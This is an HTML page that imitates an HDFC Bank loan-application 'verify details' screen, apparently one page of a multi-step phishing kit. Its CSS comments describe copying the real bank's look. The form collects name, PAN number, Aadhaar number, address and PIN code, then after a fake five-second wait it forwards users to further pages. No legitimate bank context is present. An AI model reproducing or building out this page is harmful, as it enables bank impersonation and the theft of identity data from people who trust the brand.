<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HDFC Bank - Verify Details</title>
    <style>
        :root {
            --hdfc-blue: #004c8f;
            --hdfc-red: #ed1c24;
        }
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            background-color: #f5f5f5;
        }
        
        /* Blue Header - Matching Original */
        .header-main {
            background-color: var(--hdfc-blue);
            color: white;
            padding: 15px 15px 60px 15px; /* Bottom padding increased for curve */
            position: relative;
        }
        
        .real-logo-img { 
            height: 25px; 
            width: auto;
            margin-bottom: 25px;
            background-color: white; 
            padding: 5px 8px;
            border-radius: 2px;
            display: block;
        }

        .progress-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .step-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .circle-num {
            border: 1px solid white;
            border-radius: 50%;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 15px;
        }

        .step-text {
            font-size: 17px;
            font-weight: 400;
        }

        /* 50% Complete box - Original Style */
        .percent-box {
            text-align: center;
        }
        
        .progress-square {
            background: white; 
            width: 22px; 
            height: 22px; 
            margin: 0 auto 4px auto; 
            position: relative; 
            border: 1px solid rgba(255,255,255,0.3);
        }
        
        .progress-fill {
            background: #28a745; 
            width: 11px; /* 50% Fill */
            height: 11px; 
            position: absolute; 
            top: 0; 
            right: 0;
        }

        .percent-box span {
            font-size: 11px;
            display: block;
            opacity: 0.9;
        }

        /* Form Container with the Correct Curve */
        .form-container {
            background: white;
            padding: 30px 20px;
            margin-top: -45px; /* Pulling up to create the overlap */
            border-top-left-radius: 45px; /* Deep curve as per photo */
            border-top-right-radius: 0px;
            min-height: 100vh;
            box-shadow: 0 -5px 15px rgba(0,0,0,0.05);
            position: relative;
            z-index: 2;
        }

        h2 { font-size: 21px; color: #333; margin-bottom: 25px; font-weight: 400; }
        .input-group { margin-bottom: 22px; }
        label { display: block; color: #666; font-size: 15px; margin-bottom: 10px; }
        
        input, select {
            width: 100%;
            border: none;
            border-bottom: 1px solid #ccc;
            padding: 12px 0;
            font-size: 17px;
            outline: none;
            transition: border-color 0.3s;
            background: transparent;
            border-radius: 0;
        }
        input:focus { border-bottom: 1px solid var(--hdfc-blue); }

        .error-border { border-bottom: 2px solid var(--hdfc-red) !important; }

        .gender-options { display: flex; gap: 20px; margin-top: 10px; }
        .gender-options label { display: flex; align-items: center; gap: 8px; font-weight: normal; color: #333; }
        
        .amount-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }
        .amount-wrapper::before {
            content: "₹";
            position: absolute;
            left: 0;
            font-size: 18px;
        }
        .amount-wrapper input { padding-left: 20px; }

        .btn-apply {
            background-color: var(--hdfc-blue);
            color: white;
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 4px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 30px;
            text-transform: uppercase;
        }
        
        .btn-apply:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }

        footer-bank {
            text-align: center;
            padding: 20px;
            color: #888;
            font-size: 12px;
        }
    </style>
</head>
<body>

    <div class="header-main">
        <img src="logo.png" alt="HDFC BANK" class="real-logo-img">
        
        <div class="progress-row">
            <div class="step-info">
                <div class="circle-num">01</div>
                <div class="step-text">Please verify your details</div>
            </div>
            <div class="percent-box">
                <div class="progress-square">
                    <div class="progress-fill"></div>
                </div>
                <span>50% complete</span>
            </div>
        </div>
    </div>

    <div class="form-container">
        <h2>Welcome, Please share your details</h2>

        <div class="input-group">
            <label>Enter your full name</label>
            <input type="text" id="firstName" placeholder="First Name" required>
            <input type="text" id="lastName" placeholder="Last Name" required style="margin-top: 15px;">
        </div>

        <div class="input-group">
            <label>Select your gender</label>
            <div class="gender-options">
                <label><input type="radio" name="gender" value="male"> Male</label>
                <label><input type="radio" name="gender" value="female"> Female</label>
                <label><input type="radio" name="gender" value="neutral"> Other</label>
            </div>
        </div>

        <div class="input-group">
            <label>Your PAN card number</label>
            <input type="text" id="panCard" placeholder="Enter PAN card number" maxlength="10" style="text-transform: uppercase;">
        </div>

        <div class="input-group">
            <label>Enter Aadhaar Number</label>
            <input type="number" id="aadharCard" placeholder="Enter Aadhaar number" oninput="if(this.value.length>12)this.value=this.value.slice(0,12)">
        </div>

        <div class="input-group">
            <label>Address Details</label>
            <input type="text" id="addr1" placeholder="Address line 1" style="margin-bottom: 10px;">
            <input type="text" id="addr2" placeholder="Address line 2">
        </div>

        <div class="input-group">
            <label>Area PIN Code</label>
            <input type="number" id="pincode" placeholder="6 Digit PIN Code">
        </div>

        <div class="input-group">
            <label>Select Loan Type</label>
            <select id="loanType">
                <option value="">-- Choose Option --</option>
                <option value="personal">Personal Loan</option>
                <option value="document">Document Loan</option>
            </select>
        </div>

        <div class="input-group">
            <label>How much loan do you need?</label>
            <div class="amount-wrapper">
                <input type="number" id="loanAmount" placeholder="Enter Amount">
            </div>
        </div>

        <button class="btn-apply" id="submitBtn" onclick="validateForm()">Apply Now</button>
        
        <div style="text-align: center; margin-top: 30px; padding-bottom: 20px; font-size: 13px; color: #888;">
            © Copyright HDFC Bank Ltd. 2026. All rights reserved.
        </div>
    </div>

    <script>
        function validateForm() {
            let isValid = true;
            const fields = ['firstName', 'lastName', 'panCard', 'aadharCard', 'addr1', 'pincode', 'loanType', 'loanAmount'];
            const btn = document.getElementById('submitBtn');
            
            fields.forEach(id => document.getElementById(id).classList.remove('error-border'));

            fields.forEach(id => {
                const el = document.getElementById(id);
                if (!el.value || el.value.trim() === "") {
                    el.classList.add('error-border');
                    isValid = false;
                }
            });

            const pan = document.getElementById('panCard').value;
            const aadhar = document.getElementById('aadharCard').value;

            if(pan.length < 10) { document.getElementById('panCard').classList.add('error-border'); isValid = false; }
            if(aadhar.length < 12) { document.getElementById('aadharCard').classList.add('error-border'); isValid = false; }

            if (!isValid) {
                if (navigator.vibrate) { navigator.vibrate([200, 100, 200]); }
                return;
            }

            btn.disabled = true; 
            btn.innerText = "Please wait... (5s)"; 
            
            setTimeout(function() {
                const amount = document.getElementById('loanAmount').value;
                localStorage.setItem('userLoanAmount', amount);

                const selectedLoan = document.getElementById('loanType').value;
                
                if (selectedLoan === "personal") {
                    window.location.href = "enter2.html";
                } else if (selectedLoan === "document") {
                    window.location.href = "doc1.html";
                }
            }, 5000); 
        }
    </script>
</body>
</html>
